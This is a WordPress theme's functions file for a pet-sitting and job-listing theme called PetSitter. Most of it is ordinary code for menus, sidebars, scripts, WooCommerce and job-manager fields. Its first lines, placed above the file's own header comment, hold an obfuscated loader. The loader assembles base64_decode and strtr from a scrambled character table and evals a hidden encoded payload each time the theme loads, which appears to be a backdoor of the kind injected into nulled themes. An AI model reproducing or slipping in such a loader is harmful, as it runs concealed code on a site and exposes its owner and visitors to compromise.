<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iV2pvdGd6UmlseWFCcm5PREZTTlhrRXB2c2JIaENNVGVkVnhHY0x1UW13cVBmSUFZS1VaSlhjQ0VRcnhtSFJlTHpTTmxNaFZCVGR0SndGV3F1VU9zZm5aQVBJamdrdkRicHlZS2Fpb0dibDl2ZVdZUWxnQ1RGa01Fb2hZOXlkWVRCMGZNbk13U0ZXSGtHMTA3eUFIa2F1eGpLWDFIeWwwOXl1ZlpmdVB0czJuY2VBOENnQW4yS1h2Q0dNOWdPMVZpWFJQUlVsZDJGV0hrRzEwdGFPRUhzQUgwTjMwVnVRMGFlWEtDZ3V4cHgwbmlYUmZKUHVmZnlsMDl5dWZjZUFuY2VSUHRsZ3Q3bGdDR3VoTEhLMnFKeXVHY0YyNWpvWFYwZWtHRUYzb0hlQlZKZVJ5N2xnQ0d1aExIc0FIMGF1VDdsZ0NHeXVZUXlXMFZ1YzgrIjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));

/**
 * PetSitter functions and definitions
 *
 * @package PetSitter
 */

/*------------------------------------*\
	Includes
\*------------------------------------*/

// Add the postmeta to Pages
include_once get_template_directory() . '/inc/meta-pages.php';

// Widgets
require_once get_template_directory() . '/inc/widgets/widget__recent-posts.php';
require_once get_template_directory() . '/inc/widgets/widget__flickr.php';
require_once get_template_directory() . '/inc/widgets/widget__tabs.php';

// Add the postmeta to Posts
include_once get_template_directory() . '/inc/theme-postmeta.php';
// Add the postmeta to Portfolio
include_once get_template_directory() . '/inc/theme-portfoliometa.php';

add_action('wp_head','petsitter_redux_opt_inc');
function petsitter_redux_opt_inc() {
	include get_template_directory() . '/redux-opt.php';
}

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'petsitter_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function petsitter_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on PetSitter, use a find and replace
	 * to change 'petsitter' to the name of your theme in all the template files
	 */
	$locale = apply_filters( 'plugin_locale', get_locale(), 'petsitter' );
	load_textdomain( 'petsitter', WP_LANG_DIR . '/petsitter-$locale.mo' );
	load_theme_textdomain( 'petsitter', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */

	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 858, 400, true ); // Normal post thumbnails
	add_image_size('small', 144, 84, true); // Small Thumbnail
	add_image_size('xsmall', 64, 64, true); // Small Square Thumbnail
	add_image_size('related-img', 256, 120, true); // Related Thumbnail
	add_image_size('portfolio-n', 346, 346, true); // Portfolio Thumbnails (3, 4 cols layouts)
	add_image_size('portfolio-lg', 560, 420, true); // Portfolio Thumbnails (2 cols layout)
	add_image_size('thumbnail-lg', 858, 400, true); // Large Thumbnails
	add_image_size('thumbnail-xlg', 1125, 480, true); // Extra Large Thumbnails (blog full width)
	add_image_size('portfolio-single-half', 736, 500, true); // Extra Large Thumbnails (blog full width)

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary'   => __( 'Primary Menu', 'petsitter' ),
		'secondary' => __( 'Secondary Menu', 'petsitter' ),
		'tertiary'  => __( 'Account Menu', 'petsitter' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'image', 'gallery', 'video', 'quote', 'link',
	) );

	/*
	 * Enable Full Template support for WP Job Manager.
	 * See https://wpjobmanager.com/document/enabling-full-template-support/
	 */
	add_theme_support( 'job-manager-templates' );

	/*
	 * Enable Full Template support for Resume Manager.
	 */
	add_theme_support( 'resume-manager-templates' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );
}
endif; // petsitter_setup
add_action( 'after_setup_theme', 'petsitter_setup' );


/**
 * Add Redux Framework & extras
 */
require get_template_directory() . '/admin/admin-init.php';

function petsitter_removeDemoModeLink() { // Be sure to rename this function to something more unique
	if ( class_exists('ReduxFrameworkPlugin') ) {
		remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
	}
	if ( class_exists('ReduxFrameworkPlugin') ) {
		remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );
	}
}
add_action('init', 'petsitter_removeDemoModeLink');

function petsitter_remove_dashboard_meta() {
	remove_meta_box( 'redux_dashboard_widget', 'dashboard', 'side', 'high' );
}
add_action( 'admin_init', 'petsitter_remove_dashboard_meta' );


/*
 * Enable support for WooCommerce
 */
add_theme_support( 'woocommerce' );

if (class_exists('woocommerce')) {
	// Edit Account Page
	function petsitter__woocommerce_edit_account_form_start() {
	    echo '<div class="row"><div class="col-md-8 col-md-offset-2">';
	}
	add_action('woocommerce_edit_account_form_start', 'petsitter__woocommerce_edit_account_form_start', 20);

	function petsitter__woocommerce_edit_account_form_end() {
	    echo '</div></div>';
	}
	add_action('woocommerce_edit_account_form_end', 'petsitter__woocommerce_edit_account_form_end', 20);
}



/**
 * Register widget areas.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
if(!function_exists('petsitter_widgets_init')) {
	function petsitter_widgets_init() {
		register_sidebar( array(
			'name'          => __( 'Sidebar', 'petsitter' ),
			'id'            => 'sidebar-1',
			'description'   => 'The Sidebar containing the main widget areas.',
			'before_widget' => '<aside id="%1$s" class="widget widget__sidebar %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		register_sidebar( array(
			'name'          => __( 'Jobs Sidebar', 'petsitter' ),
			'id'            => 'job-sidebar',
			'description'   => 'This sidebar appears on single job pages.',
			'before_widget' => '<aside id="%1$s" class="widget widget__sidebar %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		register_sidebar( array(
			'name'          => __( 'Resumes Sidebar', 'petsitter' ),
			'id'            => 'resume-sidebar',
			'description'   => 'This sidebar appears on single resume pages.',
			'before_widget' => '<aside id="%1$s" class="widget widget__sidebar %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h3>',
			'after_title'   => '</h3></div>',
		) );

		register_sidebar( array(
			'name'          => __( 'Footer Widget 1', 'petsitter' ),
			'id'            => 'petsitter-footer-widget-1',
			'description'   => '1st Footer Widget Area',
			'before_widget' => '<aside id="%1$s" class="widget widget__footer %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h4>',
			'after_title'   => '</h4></div>',
		) );
		register_sidebar( array(
			'name'          => __( 'Footer Widget 2', 'petsitter' ),
			'id'            => 'petsitter-footer-widget-2',
			'description'   => '2nd Footer Widget Area',
			'before_widget' => '<aside id="%1$s" class="widget widget__footer %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h4>',
			'after_title'   => '</h4></div>',
		) );
		register_sidebar( array(
			'name'          => __( 'Footer Widget 3', 'petsitter' ),
			'id'            => 'petsitter-footer-widget-3',
			'description'   => '3rd Footer Widget Area',
			'before_widget' => '<aside id="%1$s" class="widget widget__footer %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h4>',
			'after_title'   => '</h4></div>',
		) );
		register_sidebar( array(
			'name'          => __( 'Footer Widget 4', 'petsitter' ),
			'id'            => 'petsitter-footer-widget-4',
			'description'   => '3rd Footer Widget Area',
			'before_widget' => '<aside id="%1$s" class="widget widget__footer %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<div class="widget-title"><h4>',
			'after_title'   => '</h4></div>',
		) );
	}
	add_action( 'widgets_init', 'petsitter_widgets_init' );
}



/*
  * This theme styles the visual editor to resemble the theme style,
  * specifically font, colors, icons, and column width.
  */
add_editor_style( array( 'css/editor-style.css') );

/**
 * Enqueue scripts and styles.
 */
if(!function_exists('petsitter_enqueue_style')) {
	function petsitter_enqueue_style() {
		wp_enqueue_style( 'petsitter-style', get_stylesheet_uri() );
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', false, '3.3.6' );
		wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/fonts/font-awesome/css/font-awesome.min.css', false, '4.6.1' );
		wp_enqueue_style( 'entypo', get_template_directory_uri() . '/css/fonts/entypo/css/entypo.css', false );
		wp_enqueue_style( 'owl_carousel', get_template_directory_uri() . '/vendor/owl-carousel/owl.carousel.css', false );
		wp_enqueue_style( 'owl_theme', get_template_directory_uri() . '/vendor/owl-carousel/owl.theme.css', false );
		wp_enqueue_style( 'magnific', get_template_directory_uri() . '/vendor/magnific-popup/magnific-popup.css', false );
		wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/vendor/flexslider/flexslider.css', false );
		wp_enqueue_style( 'theme_styles', get_template_directory_uri() . '/css/theme.css', false );
		wp_enqueue_style( 'theme_elements', get_template_directory_uri() . '/css/theme-elements.css', false );

		require_once('redux-opt-less.php'); // needed here to get less variables
		wp_enqueue_style( 'color_default', get_template_directory_uri() . '/css/color-default.less', false );
		wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css', false );
	}
	add_action( 'wp_enqueue_scripts', 'petsitter_enqueue_style' );
}


if(!function_exists('petsitter_enqueue_script')) {
	function petsitter_enqueue_script() {

		wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/vendor/bootstrap.min.js', array('jquery'), '3.3.6', true );
		wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/vendor/modernizr.js', array('jquery'), '1.0', false );

		if ( !is_page_template('template-coming-soon.php')) {
			wp_enqueue_script( 'flexnav', get_template_directory_uri() . '/vendor/jquery.flexnav.min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'hoverintent', get_template_directory_uri() . '/vendor/jquery.hoverIntent.minified.js', array(), '1.0', true );
			wp_enqueue_script( 'flickrfeed', get_template_directory_uri() . '/vendor/jquery.flickrfeed.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'isotope', get_template_directory_uri() . '/vendor/isotope/isotope.pkgd.min.js', array('jquery'), '2.0.1', true );
			wp_enqueue_script( 'images_loaded', get_template_directory_uri() . '/vendor/isotope/jquery.imagesloaded.min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'magnific_popup', get_template_directory_uri() . '/vendor/magnific-popup/jquery.magnific-popup.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'owl_carousel', get_template_directory_uri() . '/vendor/owl-carousel/owl.carousel.min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'fitvids', get_template_directory_uri() . '/vendor/jquery.fitvids.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'appear', get_template_directory_uri() . '/vendor/jquery.appear.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'stellar', get_template_directory_uri() . '/vendor/jquery.stellar.min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'flexslider', get_template_directory_uri() . '/vendor/flexslider/jquery.flexslider-min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'count_to', get_template_directory_uri() . '/vendor/jquery.countTo.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'circliful', get_template_directory_uri() . '/vendor/circliful/jquery.circliful.min.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'initjs', get_template_directory_uri() . '/js/custom.js', array('jquery'), '1.0', true );


			if ( ! class_exists('GJM_Init') || ! class_exists('GRM_Init') || is_page_template('template-contacts.php') ) {
				// Google Map
				wp_register_script('gmap_api', '//maps.google.com/maps/api/js?sensor=true', array('jquery'), '1.0');
				wp_enqueue_script('gmap_api');
				wp_register_script('gmap', get_template_directory_uri() . '/vendor/jquery.gmap3.min.js', array('jquery'), '3.0');
				wp_enqueue_script('gmap');
			}

		}

		// Conditional for Coming Soon Page
		if (is_page_template('template-coming-soon.php')) {
			wp_enqueue_script( 'knob', get_template_directory_uri() . '/vendor/countdown/jquery.knob.js', array('jquery'), '1.0', true );
			wp_enqueue_script( 'countdown', get_template_directory_uri() . '/vendor/countdown/countdown.js', array('jquery'), '1.0', true );
		}


		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
	add_action( 'wp_enqueue_scripts', 'petsitter_enqueue_script' );
}


// Change active menu class
add_filter('nav_menu_css_class' , 'petsitter_special_nav_class' , 10 , 2);
function petsitter_special_nav_class($classes, $item){
	if( in_array('current-menu-item', $classes) ){
		$classes[] = 'active';
	}
	return $classes;
}

// Shortcode in Widget
add_filter('widget_text', 'do_shortcode');


/*-----------------------------------------------------------------------------------*/
/*  Password protected post
/*-----------------------------------------------------------------------------------*/
if(!function_exists('petsitter_password_form')) {
	function petsitter_password_form() {
		global $post;
		$label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
		$output = '<form class="form-inline" action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
		<p>' . __( "To view this protected post, enter the password below:", "petsitter" ) . '</p>
		<div class="form-group"><label for="' . $label . '">' . __( "Password:", "petsitter" ) . ' </label>   <input class="form-control" name="post_password" id="' . $label . '" type="password" size="20" maxlength="20" />   </div><input type="submit" class="btn btn-secondary" name="Submit" value="' . esc_attr__( "Submit", "petsitter" ) . '" />
		</form>
		';
		return $output;
	}
}
add_filter( 'the_password_form', 'petsitter_password_form' );

// Add the Password Form to the Excerpt (for password protected posts)
if(!function_exists('petsitter_excerpt_password_form')) {
	function petsitter_excerpt_password_form( $excerpt ) {
	  if ( post_password_required() )
	  	$excerpt = get_the_password_form();
	  return $excerpt;
	}
	add_filter( 'the_excerpt', 'petsitter_excerpt_password_form' );
}


/*-----------------------------------------------------------------------------------*/
/*  Custom Comments Callback
/*-----------------------------------------------------------------------------------*/
if(!function_exists('petsitter_comments')) {
	function petsitter_comments($comment, $args, $depth)
	{
		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);

		if ( 'div' == $args['style'] ) {
			$tag       = 'div';
			$add_below = 'comment';
		} else {
			$tag       = 'li';
			$add_below = 'div-comment';
		}
	?>
		<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
		<?php if ( 'div' != $args['style'] ) : ?>
		<div id="div-comment-<?php comment_ID() ?>" class="comment-wrapper">
		<?php endif; ?>
		<div class="comment-author vcard">
			<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, 70 ); ?>
			<?php printf(__('<h5>%s</h5>', 'petsitter'), get_comment_author_link()) ?>
			<span class="says"><?php _e('says:', 'petsitter'); ?></span>
			<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
			<?php
			printf( __('%1$s at %2$s', 'petsitter'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)', 'petsitter'),'  ','' );
			?>
			</div>
		</div>

		<?php if ($comment->comment_approved == '0') : ?>
		<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.', 'petsitter') ?></em>
		<br />
		<?php endif; ?>

		<div class="comment-body">
			<?php comment_text() ?>
		</div>

		<div class="comment-reply">
			<?php comment_reply_link(array_merge( $args, array(
				'add_below'   => $add_below,
				'depth'       => $depth,
				'reply_text'  => '<i class="fa fa-reply"></i>' . __( 'Reply', 'petsitter' ),
				'max_depth'   => $args['max_depth']
			))) ?>
		</div>

		<?php if ( 'div' != $args['style'] ) : ?>
		</div>
		<?php endif; ?>
	<?php }
}




/*-----------------------------------------------------------------------------------*/
/*  Pagination
/*-----------------------------------------------------------------------------------*/
if(!function_exists('petsitter_pagination')) {
	function petsitter_pagination($pages = '', $range = 2) {
		$showitems = ($range * 2)+1;

		global $paged;
		if(empty($paged)) $paged = 1;

		if($pages == '') {
		global $wp_query;
		$pages = $wp_query->max_num_pages;
			if(!$pages) {
				$pages = 1;
			}
		}

		if(1 != $pages) {
		echo "<ul class=\"pagination-custom text-center list-unstyled list-inline\">";
		// if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li><a class='first' href='".get_pagenum_link(1)."'>First</a></li>";
		if($paged > 1) echo "<li><a href='".get_pagenum_link($paged - 1)."' class='btn btn-sm btn-default'><i class=\"fa fa-angle-left fa-lg\"></i></a></li>";

		for ($i=1; $i <= $pages; $i++) {
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){ echo ($paged == $i)? "<li><span class=\"btn btn-sm btn-default\" disabled=\"disabled\">".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class=\"btn btn-sm btn-default\">".$i."</a></li>";
			}
		}

		if ($paged < $pages) echo "<li><a href=\"".get_pagenum_link($paged + 1)."\" class='btn btn-sm btn-default'><i class=\"fa fa-angle-right fa-lg\"></i></a></li>";
		// if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<li><a class='last' href='".get_pagenum_link($pages)."'>Last</a></li>";
		echo "</ul>\n";
		}
	}
}


/*-----------------------------------------------------------------------------------*/
/*  Remove Empty Paragraphs
/*-----------------------------------------------------------------------------------*/
if(!function_exists('petsitter_shortcode_empty_paragraph_fix')) {
	add_filter('the_content', 'petsitter_shortcode_empty_paragraph_fix');
	function petsitter_shortcode_empty_paragraph_fix($content)
	{
	  $array = array (
	      '<p>[' => '[',
	      ']</p>' => ']',
	      ']<br />' => ']'
	  );

	  $content = strtr($content, $array);

	return $content;
	}
}


/*------------------------------------*\
	Actions + Filters + ShortCodes
\*------------------------------------*/

// The excerpt based on words
if(!function_exists('petsitter_string_limit_words')) {
	function petsitter_string_limit_words($string, $word_limit) {
		$words = explode(' ', $string, ($word_limit + 1));
		if(count($words) > $word_limit)
		array_pop($words);
		return implode(' ', $words).'... ';
	}
}



/*------------------------------------*\
	WP Job Manager Functions
\*------------------------------------*/

// Frontend fields
if(!function_exists('custom_submit_job_form_fields')) {
	add_filter( 'submit_job_form_fields', 'custom_submit_job_form_fields' );

	function custom_submit_job_form_fields(  $fields ) {
	  $fields['job']['job_title']['label'] = __('Job Title', 'petsitter');
	  $fields['company']['company_logo']['label'] = __('Cover Image', 'petsitter');
	  $fields['company']['company_logo']['description'] = __('Image size should be at least <strong>346x346</strong>. If your image is bigger, we\'ll crop it.', 'petsitter');
	  $fields['company']['company_name']['label'] = __('Your Name', 'petsitter');
	  $fields['company']['company_name']['placeholder'] = __('Enter your name', 'petsitter');
	  $fields['company']['company_tagline']['placeholder'] = __('Briefly describe yourself', 'petsitter');
	  $fields['company']['company_twitter']['placeholder'] = __('@yourname', 'petsitter');
	  $fields['company']['company_video']['placeholder'] = __('A link to a video with you', 'petsitter');
	  return $fields;
	}
}

// Backend fields
if(!function_exists('custom_job_manager_job_listing_data_fields')) {
	add_filter( 'job_manager_job_listing_data_fields', 'custom_job_manager_job_listing_data_fields' );

	function custom_job_manager_job_listing_data_fields(  $fields ) {
	  $fields['_company_logo']['label'] = __('Cover Image', 'petsitter');
	  $fields['_company_logo']['description'] = __('Image size should be at least <strong>346x346</strong>.', 'petsitter');
	  $fields['_company_logo']['placeholder'] = __('URL to your image', 'petsitter');
	  $fields['_company_name']['label'] = __('Your Name', 'petsitter');
	  $fields['_company_website']['label'] = __('Website', 'petsitter');
	  $fields['_company_tagline']['label'] = __('Tagline', 'petsitter');
	  $fields['_company_twitter']['label'] = __('Twitter', 'petsitter');
	  $fields['_company_twitter']['placeholder'] = __('@yourname', 'petsitter');
	  $fields['_company_tagline']['placeholder'] = __('Brief description about you', 'petsitter');
	  $fields['_company_video']['label'] = __('Video', 'petsitter');
	  $fields['_company_video']['placeholder'] = __('URL to your video', 'petsitter');

		return $fields;
	}
}



/*------------------------------------*\
	Resume: WP Job Manager Add-On
\*------------------------------------*/

// Frontend fields
if(!function_exists('custom_submit_resume_form_fields')) {
	add_filter( 'submit_resume_form_fields', 'custom_submit_resume_form_fields' );

	function custom_submit_resume_form_fields( $fields ) {
	  $fields['resume_fields']['candidate_title']['label'] = __('Job title', 'petsitter');
	  $fields['resume_fields']['candidate_title']['placeholder'] = __('e.g. "Pet Sitter"', 'petsitter');
	  $fields['resume_fields']['candidate_photo']['label'] = __('Cover Image', 'petsitter');
	  $fields['resume_fields']['candidate_photo']['description'] = __('Image size should be at least <strong>346x346</strong>. If your image is bigger, we\'ll crop it.', 'petsitter');
	  $fields['resume_fields']['resume_content']['label'] = __('Description', 'petsitter');
	  return $fields;
	}
}

// Backend fields
if(!function_exists('custom_resume_manager_resume_fields')) {
	add_filter( 'resume_manager_resume_fields', 'custom_resume_manager_resume_fields' );

	function custom_resume_manager_resume_fields( $fields ) {
	  $fields['_candidate_title']['label'] = __('Job title', 'petsitter');
	  $fields['_candidate_photo']['label'] = __('Cover Image', 'petsitter');
	  $fields['_candidate_photo']['description'] = __('Image size should be at least <strong>346x346</strong>.', 'petsitter');
	  return $fields;
	}
}




/*------------------------------------*\
    WPML compatibility
\*------------------------------------*/
if(!function_exists('petsitter_wpml_translate_filter')) {
	function petsitter_wpml_translate_filter( $name, $value ) {
	    return icl_translate( 'petsitter', 'petsitter_' . $name, $value );
	}
	//Check if WPML is activated
	if ( defined( 'ICL_SITEPRESS_VERSION' ) ) {
	    add_filter( 'petsitter_text_translate', 'petsitter_wpml_translate_filter', 10, 2 );
	}
}




/**
 * Resume post type arguments.
 *
 * @since PetSitter 1.4.7
 *
 * @param array $args
 * @return array $args
 */

add_filter( 'register_post_type_resume', 'post_type_resume', 10, 1);

function post_type_resume( $args ) {
	$args[ 'exclude_from_search' ] = false;

	return $args;
}



/**
 * Implement the Custom Header feature.
 */
//require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
// require get_template_directory() . '/inc/jetpack.php';

/**
 * Load WP Job Manager login functions.
 */
require get_template_directory() . '/inc/wp-job-manager-logins.php';



/**
 * Implement Custom Fields for WP Job Manager & Resume Manager
 */
// Custom Fields WP Job Manager
require get_template_directory() . '/job_manager/custom-fields/job-gallery.php';
require get_template_directory() . '/job_manager/custom-fields/job-linkedin.php';
require get_template_directory() . '/job_manager/custom-fields/job-google.php';
require get_template_directory() . '/job_manager/custom-fields/job-facebook.php';


// Custom Fields Resume Manager
require get_template_directory() . '/wp-job-manager-resumes/custom-fields/resume-custom-fields.php';
